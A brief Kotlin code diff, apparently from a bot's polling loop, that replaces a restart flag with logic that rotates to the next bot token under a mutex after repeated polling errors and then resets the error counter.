-                    if (consecutivePollingErrors >= MAX_CONSECUTIVE_ERRORS) pollingRestartNeeded.set(true)
+                    if (consecutivePollingErrors >= MAX_CONSECUTIVE_ERRORS) {
+                        leaderMutex.withLock {
+                            primaryBotIndex = (primaryBotIndex + 1) % activeTokensList.size
+                        }
+                        consecutivePollingErrors = 0
+                    }
                     delay(minOf(consecutivePollingErrors * 2000L, 30000L))
                 }
             }
